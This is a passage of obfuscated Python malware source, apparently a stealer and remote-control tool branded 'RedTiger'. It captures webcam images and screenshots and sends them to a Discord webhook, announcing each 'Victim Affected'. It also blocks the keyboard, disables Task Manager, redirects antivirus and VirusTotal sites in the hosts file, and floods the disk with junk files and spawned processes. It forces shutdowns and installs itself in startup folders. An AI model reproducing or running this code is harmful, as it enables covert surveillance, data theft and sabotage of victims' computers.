        AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR = Embed(title=f"Camera Capture {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:", color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW, description=f"```└── 📷 - {DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT_file_capture}```")
        AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)

        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)
        with open(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture, "rb") as f:
            CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(
                embed=AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR,
                file=File(f, filename=DZWXDJAUFSVQEFZSCLGUMQPBXBTHOXURBCQLHBHIDFUTAMOKPT_file_capture),
                username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS,
                avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ
            )
            
        if os.path.exists(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture):
            os.remove(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_file_capture)
    except Exception as e:
        HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(
            RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, 
            title=f'Camera Capture {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', 
            description=f"""Unable to make a recording:
            ```{e}```"""
        )

def NJORNFAGUXPPAQJTFBCJDLYHIGVRZGRJZTPUPSFPISQDEJOLEHUFDXFRWPMOQYDFB():
    import subprocess
    import time
    try:
        subprocess.Popen(["control", "userpasswords2"])
        time.sleep(2)
    except:
        pass

def PWBTEMFDRQRJMZNXFXANCUFBPOUHKAWEHCWJZAXZVEJZATLKGXKEXYKBRINEFVWFCIWUSLVALZQNELZQBVDN():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes = io.BytesIO()
            QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU.save(QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes, format='PNG')
            QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes.seek(0)
            return QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes
        
        QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes = C4ptur3()

        AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR = Embed(title=f"Screenshot {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:", color=EFSWMHTVETEZDWCBKEMXAHVZPLFCGFWCLUZCRFJJEYNSKRYGLNTPRUYW)
        AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.set_image(url="attachment://screenshot.png")
        AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR.set_footer(text=GSKOYQBPLTAZTJYETFJLNDYOMYNWBGHBUBBACGZNJYAZRFKGVAXHTWEPOYWZMIPNHRWKOCQMKCFWQZGTWYSHYEIPUIJQTGHGIUY, icon_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ)
        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK = SyncWebhook.from_url(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ)
        CUDONGQCHGZZPKNWUXEGYEUFSCLFBJLNWSNDAKZYKQZGWXXDPSK.send(
            embed=AVDFEEMDRMVPLUVANTXNPYECGWCIABPSAAQVONCZGABNWADYQXGFTNRDIWPMOUEJYKQR,
            file=File(QLNGFYLNMCAZUQSCOTZFSDICIUCFSMWFJFVOWVOQFCAUGXCXHZOHSYOMOZZAXDIFCPPILILUHZNJLLBNWGKSFZRKPGEKU_bytes, filename="screenshot.png"),
            username=BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS,
            avatar_url=HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ
        )
    except Exception as e:
        HHNDDPEDUIPODFIEGZPKTOMSYWFILBPGDXPURXRKOSXXDXKNAVCDQSMCXDFKFRJFRXEXQTEICHUWGGKTRQDWLBRKOJCKSZL(
            RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, 
            title=f'Screenshot {NADSFPUELPXXMDMXIWFCEXTCECYDVOPQLAAQJNETRHOJSZHRLXCXTAAFAURGBBGOJADMMKVCB}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

def GRGIABIEEKLGKIUSXPJPJIYAUSPEANEQKEIOBOTYJMFDZWQPPMAGVWSMEENGSNG():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.block_key(k3y_b10ck)
        except: pass

def OICSTXKROHBLZAKJAKREHGJHTNDXEWWDOPXFIHLVKTFBFAJCABUBRFZTRUXFEVSWJFUGIBRCZRDDQXZ():
    import keyboard
    k3y = [
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
        "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "ù",
        "`", "+", "-", "=", "*", "[", "]", "\\", ";", "'", ",", ".", "/", 
        "space", "enter", "esc", "tab", "backspace", "delete", "insert",
        "up", "down", "left", "right", "equal", "home", "end", "page up", "page down",
        "caps lock", "num lock", "scroll lock", "shift", "ctrl", "cmd", "win",
        "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12",
        "backslash", "semicolon", "comma", "period", "slash",
        "volume up", "volume down", "volume mute",
        "app", "sleep", "print screen", "pause",
    ]
    for k3y_b10ck in k3y:
        try: keyboard.unblock_key(k3y_b10ck)
        except: pass

def OKSDMPPBNTFWBCSHNKGBWWJSZKCXXABLJYGSIMGYHUCAMYATQJCTALCBQMJQZTUP():
    import pyautogui
    pyautogui.FAILSAFE = False
    width, height = pyautogui.size()
    pyautogui.moveTo(width + 100, height + 100)

def KKXZCFLVOQOBSLWAUWKOHVJUSSSYMQKJCPXETBDXYTLENHAPZTUWUSASFBYOCSPKXBYXXALRTAIYOGRJQWXNDRNINOM():
    import psutil
    import subprocess
    import os

    "Perm Admin Required"
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Taskmgr.exe':
            proc.terminate()
            break
    subprocess.run("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def BHANHYPZGRPLVGHGGZYOFWJLQWUALUPFAUYFUDIDPKOLNWROBNSZYRVQOVDTG():
    import os

    "Perm Admin Required"
    try:
        def DEPSTZCWYXOUCBZZFNXBCNZQUVQTANSNLBYKLFDRYBJCMEXHTMWFCVDQJGCNAKFOJIOYZE(QDSYQPUPCQHKSQSFMBNCOJWMZVBAXODVMOFGSSRODLMWCXEGCKMUBOFAUMATFXERIFGNLXC):
            HUIXNLXSNXNSRUIYMMUIGSOIEMKHVMANRLUMLNTQDLTZNMZSGDWFHHJHXTQPTSDPKVIDONVPUSKLPFJVI = os.path.join(os.environ["WINDIR"], "System32", "drivers", "etc", "hosts")
            if not os.path.exists(HUIXNLXSNXNSRUIYMMUIGSOIEMKHVMANRLUMLNTQDLTZNMZSGDWFHHJHXTQPTSDPKVIDONVPUSKLPFJVI):
                HUIXNLXSNXNSRUIYMMUIGSOIEMKHVMANRLUMLNTQDLTZNMZSGDWFHHJHXTQPTSDPKVIDONVPUSKLPFJVI = os.path.join("C:", "Windows", "System32", "drivers", "etc", "hosts")

            JIGRZBARGFXQIHSYYRWASJFLZMRXNXIZUFCRGPHFTRFHAJSYEGQHHXKFGUERQJBINPAPVDUYY = "127.0.0.1"
            with open(HUIXNLXSNXNSRUIYMMUIGSOIEMKHVMANRLUMLNTQDLTZNMZSGDWFHHJHXTQPTSDPKVIDONVPUSKLPFJVI, "a") as v4r_file:
                v4r_file.write("\n" + JIGRZBARGFXQIHSYYRWASJFLZMRXNXIZUFCRGPHFTRFHAJSYEGQHHXKFGUERQJBINPAPVDUYY + " " + QDSYQPUPCQHKSQSFMBNCOJWMZVBAXODVMOFGSSRODLMWCXEGCKMUBOFAUMATFXERIFGNLXC)
        
        TMWNXACIKUUIJEAYOMCCLLKIRMEEECWHFQDLSLFVSGNHGWCSYJZYSQ = [
            'virustotal.com', 
            'www.virustotal.com',
            'www.virustotal.com/gui/home/upload',
            'avast.com', 
            'totalav.com', 
            'scanguard.com', 
            'totaladblock.com', 
            'pcprotect.com', 
            'mcafee.com', 
            'bitdefender.com', 
            'us.norton.com', 
            'avg.com', 
            'malwarebytes.com', 
            'pandasecurity.com', 
            'avira.com', 
            'norton.com', 
            'eset.com', 
            'zillya.com', 
            'kaspersky.com', 
            'usa.kaspersky.com', 
            'sophos.com', 
            'home.sophos.com', 
            'adaware.com', 
            'bullguard.com', 
            'clamav.net', 
            'drweb.com', 
            'emsisoft.com', 
            'f-secure.com', 
            'zonealarm.com', 
            'trendmicro.com', 
            'ccleaner.com'
        ]

        for v4r_w3b51t3_t0_8l0ck in TMWNXACIKUUIJEAYOMCCLLKIRMEEECWHFQDLSLFVSGNHGWCSYJZYSQ:
            DEPSTZCWYXOUCBZZFNXBCNZQUVQTANSNLBYKLFDRYBJCMEXHTMWFCVDQJGCNAKFOJIOYZE(v4r_w3b51t3_t0_8l0ck)
    except:
        pass

def ECUMEQPGGTPOMTIZXYYNYMWCUMMNPDDTPGOCBWDRQPHJDOXAWFZHXDCSBUAFFVSAIYKMOQDGXEZBNKADWIBXRGKY():
    import subprocess
    import threading

    def KYAHDDHXLBPUBHOYIMYYXICLDTTEQLVBJAMQUHLHDCTLRIDFAKWWRTGYDYOJBMQVKBNUTNBYEIBPSPJUHIBQNHEIWDCT():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def VAASPOGOINSQKEPWUVXZMTFAJUTCDQVJCYZNREJPOYZSLQUBJDMLYKEXPXH():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=KYAHDDHXLBPUBHOYIMYYXICLDTTEQLVBJAMQUHLHDCTLRIDFAKWWRTGYDYOJBMQVKBNUTNBYEIBPSPJUHIBQNHEIWDCT)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    VAASPOGOINSQKEPWUVXZMTFAJUTCDQVJCYZNREJPOYZSLQUBJDMLYKEXPXH()

def TMGHOLFRPKALVUGMCLRBBDVCHSZDKFIFFMXSFZTRDJKSJYESPIMSFYLBKRYQFKMPLEAQQJYOZXFZERYBYAGPIPHXNWUJ():
    import random
    import string
    import threading

    ext = [".exe", ".py", ".txt", ".png", ".ico", ".bat", 
           ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
           ".mov", ".jpg", ".pdf", ".troll", ".cooked",
           ".lol", ".funny", ".virus", ".malware"
           ".redtiger", ".redtiger", ".redtiger", ".redtiger"
    ]
    def MQIFMYLTUNUOMYCVADZRFDWXIXDCEKKPFWWCHACFPITVSXFGHVP():
        file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)

        with open(file_name, 'w', encoding='utf-8') as file:
            file.write(("".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(999999)))) * random.randint(9999999999999999999999999, 9999999999999999999999999999999999999999)

    def VAASPOGOINSQKEPWUVXZMTFAJUTCDQVJCYZNREJPOYZSLQUBJDMLYKEXPXH():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=MQIFMYLTUNUOMYCVADZRFDWXIXDCEKKPFWWCHACFPITVSXFGHVP)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    VAASPOGOINSQKEPWUVXZMTFAJUTCDQVJCYZNREJPOYZSLQUBJDMLYKEXPXH()

def OPSLLUKZHAOQOYMNQKCTOOTACPNZIUSLWHDMZRCDDCKLGTTPVMQZOVHPVQIHKSUTTYLTCYCCRNCZTUQP():
    import sys
    import os
    if sys.platform.startswith('win'):
        os.system('shutdown /s /t 15')
    elif sys.platform.startswith('linux'):
        os.system('shutdown -h +0.25')

def St4rtup():
    import os
    import sys
    import shutil

    try:
        QVJTXXXFGTCOGVQRVQQVKLRBFGVOOUIQTMZKCPLWQAKWBLRZZQ = os.path.abspath(sys.argv[0])

        if QVJTXXXFGTCOGVQRVQQVKLRBFGVOOUIQTMZKCPLWQAKWBLRZZQ.endswith(".exe"):
            JWSNITQNMXSYYFYXFPXYIALJLESNOFFWPPWTVDLEZDVLQYBPDNOGFAIIUMYZKH = "exe"
        elif QVJTXXXFGTCOGVQRVQQVKLRBFGVOOUIQTMZKCPLWQAKWBLRZZQ.endswith(".py"):
            JWSNITQNMXSYYFYXFPXYIALJLESNOFFWPPWTVDLEZDVLQYBPDNOGFAIIUMYZKH = "py"

        SALZHIYEMROTNETLYVVHDLXREOEFJYRCLFSPEUMPHQVQQZTDGGHMLOSABSYFADLTHD = f"ㅤ.{JWSNITQNMXSYYFYXFPXYIALJLESNOFFWPPWTVDLEZDVLQYBPDNOGFAIIUMYZKH}"

        if sys.platform.startswith('win'):  
            ODAVYKFJNWEZEUTYAZCZJLVBWVKVRRPMDECHJASJXFRGLNZGGTWUSNOCMJGRZCAFZTNYFNZPFZYVBHJCRJBBRCISKWCVBPUDB = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            ODAVYKFJNWEZEUTYAZCZJLVBWVKVRRPMDECHJASJXFRGLNZGGTWUSNOCMJGRZCAFZTNYFNZPFZYVBHJCRJBBRCISKWCVBPUDB = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            ODAVYKFJNWEZEUTYAZCZJLVBWVKVRRPMDECHJASJXFRGLNZGGTWUSNOCMJGRZCAFZTNYFNZPFZYVBHJCRJBBRCISKWCVBPUDB = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_new_file = os.path.join(ODAVYKFJNWEZEUTYAZCZJLVBWVKVRRPMDECHJASJXFRGLNZGGTWUSNOCMJGRZCAFZTNYFNZPFZYVBHJCRJBBRCISKWCVBPUDB, SALZHIYEMROTNETLYVVHDLXREOEFJYRCLFSPEUMPHQVQQZTDGGHMLOSABSYFADLTHD)

        shutil.copy(QVJTXXXFGTCOGVQRVQQVKLRBFGVOOUIQTMZKCPLWQAKWBLRZZQ, RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_new_file)
        os.chmod(RHFHTPZYBPWMTUMJANPTWOTALOJEDSSRUXTDADHUQHRSXVVAZFMSXOECYFACMOLCQANCWLKZCMEFN_new_file, 0o777) 
    except:
        pass

def KYAHDDHXLBPUBHOYIMYYXICLDTTEQLVBJAMQUHLHDCTLRIDFAKWWRTGYDYOJBMQVKBNUTNBYEIBPSPJUHIBQNHEIWDCTOpti0ns():
    import keyboard
    while True:
        try:
            OKSDMPPBNTFWBCSHNKGBWWJSZKCXXABLJYGSIMGYHUCAMYATQJCTALCBQMJQZTUP()
            ECUMEQPGGTPOMTIZXYYNYMWCUMMNPDDTPGOCBWDRQPHJDOXAWFZHXDCSBUAFFVSAIYKMOQDGXEZBNKADWIBXRGKY()
            TMGHOLFRPKALVUGMCLRBBDVCHSZDKFIFFMXSFZTRDJKSJYESPIMSFYLBKRYQFKMPLEAQQJYOZXFZERYBYAGPIPHXNWUJ()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

def R3st4rt():
    while True:
        time.sleep(300)

        requests.post(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, json={'content': f'****╔════════════════════Restart═══════════════════╗****', 'username': BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, 'avatar_url': HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ})
        try: JBNHKYJEHJFMMGOWCLFCOVBKTTCOFRFVOYNGQOSCUCKIVVLMWJFNMIMOIKCTTBGCTNAMVBJRNNJWULMT()
        except: pass
        try: YEOXYOURZOAJVNUCKGSSOPWNWJABPCIDUGLGQJGQBZWRLSTCLEEFXVKRCGEAYTNFHQU()
        except: pass
        try: ZMMACAIPONUIUVJDFVVNIAOSOPXQWNBOLSXCZUZTVYUNKGNHFQGDUHSBELHWTDN()
        except: pass
        try: BPIYFHUVOHJYAMAERUTZRHVKVBULUOBOCQAHLLLZNUOLRLRVUZATHTSCYTWKVXCJSNGTFWBSLBVHKGNWWFFHNAQTFGBGKKDTIYDK()
        except: pass
        try: EZUBFDNYIZFPKWUARMNFBJIPEKNTEKPKMJOWJZTGTNFJJKKJLRLDFUOTLRDT()
        except: pass
        try: SVILZSOUMACPBBITXCTKUOUDEELEHAUZPLCARGUZDJXJWYUGFCQQFDVKFTLVBHVVDIGGOINBUHTMVSOWYKTMSWETVAUEXLCOH()
        except: pass
        try: PWBTEMFDRQRJMZNXFXANCUFBPOUHKAWEHCWJZAXZVEJZATLKGXKEXYKBRINEFVWFCIWUSLVALZQNELZQBVDN()
        except: pass
        requests.post(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, json={'content': f'****╚══════════════════{EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}══════════════════╝****', 'username': BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, 'avatar_url': HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ})

try: requests.post(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, 'avatar_url': HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ,})
except: pass
try: threading.Thread(target=GRGIABIEEKLGKIUSXPJPJIYAUSPEANEQKEIOBOTYJMFDZWQPPMAGVWSMEENGSNG).start()
except: pass
try: threading.Thread(target=KKXZCFLVOQOBSLWAUWKOHVJUSSSYMQKJCPXETBDXYTLENHAPZTUWUSASFBYOCSPKXBYXXALRTAIYOGRJQWXNDRNINOM).start()
except: pass
try: threading.Thread(target=BHANHYPZGRPLVGHGGZYOFWJLQWUALUPFAUYFUDIDPKOLNWROBNSZYRVQOVDTG).start()
except: pass
try: threading.Thread(target=NMURYVOBWPGUWHUUUEVJSLVVCHLUZFPMNYBIRVDMFJYEBICOTIWHIHJIOUNSHKBGLBMQTUGQMWPMZWTIEHYAAZI).start()
except: pass
try: JBNHKYJEHJFMMGOWCLFCOVBKTTCOFRFVOYNGQOSCUCKIVVLMWJFNMIMOIKCTTBGCTNAMVBJRNNJWULMT()
except: pass
try: YEOXYOURZOAJVNUCKGSSOPWNWJABPCIDUGLGQJGQBZWRLSTCLEEFXVKRCGEAYTNFHQU()
except: pass
try: ZMMACAIPONUIUVJDFVVNIAOSOPXQWNBOLSXCZUZTVYUNKGNHFQGDUHSBELHWTDN()
except: pass
try: BPIYFHUVOHJYAMAERUTZRHVKVBULUOBOCQAHLLLZNUOLRLRVUZATHTSCYTWKVXCJSNGTFWBSLBVHKGNWWFFHNAQTFGBGKKDTIYDK()
except: pass
try: EZUBFDNYIZFPKWUARMNFBJIPEKNTEKPKMJOWJZTGTNFJJKKJLRLDFUOTLRDT()
except: pass
try: SVILZSOUMACPBBITXCTKUOUDEELEHAUZPLCARGUZDJXJWYUGFCQQFDVKFTLVBHVVDIGGOINBUHTMVSOWYKTMSWETVAUEXLCOH()
except: pass
try: NJORNFAGUXPPAQJTFBCJDLYHIGVRZGRJZTPUPSFPISQDEJOLEHUFDXFRWPMOQYDFB()
except: pass
try: PWBTEMFDRQRJMZNXFXANCUFBPOUHKAWEHCWJZAXZVEJZATLKGXKEXYKBRINEFVWFCIWUSLVALZQNELZQBVDN()
except: pass
try: requests.post(RHBNWCWDYPBZAEVPZSBPCLCIXCKMGIPYFPMVCSONFKZZVCTAHZRIQ, json={'content': f'****╚══════════════════{EWJJCSAOCFNXFKDMHYUKNMKDPYSKVRINNXJUFYNSSGJTOOKKFLNJOQDBJCWMMBBQEWLMXLLSZBRNBYUCGGJZR}══════════════════╝****', 'username': BHXYAAKWQVSJTFCMWFLZQJNUPCRIJWAIGUWXGRRXBCLPNKVDDQMTZUJCDKS, 'avatar_url': HCZWNWNKJPEZYZAXSIFDFXNEOZSCMRNIYTWIZJHOQHRTKDFMTZHGQCNFTKYMMPIFVSKPLBSRXXLEAPAQHXWZXWAAZQ})
except: pass
try: threading.Thread(target=KWMYUVODLOTHGPKCBCUAXBSYXOCJQKUPGDRJQPCBCFQWKJZQQACEXWYOMZNORTXNEQOZYLHAUUTPBKWLSDK).start()
except: pass
try: threading.Thread(target=HPIEEUTKYTYWQSVXICTCNMSAEOLPBPFTEVGXSSXOLLRSZVKKLJAYLWJJOVOZSBADZQETRIGONHTBKDXJQETRQKGQHRDN).start()
except: pass
try: threading.Thread(target=TKOCOXTFSCVEIUPONGWZPXJIXIXJLCTJUMFTNMYOZWBOHIERPVPKWAAPYPGGTGNBZBGVCVJNBQMTVMXHKUZACXKRVCPCVHUTK).start()
except: pass
try: threading.Thread(target=OPSLLUKZHAOQOYMNQKCTOOTACPNZIUSLWHDMZRCDDCKLGTTPVMQZOVHPVQIHKSUTTYLTCYCCRNCZTUQP).start()
except: pass
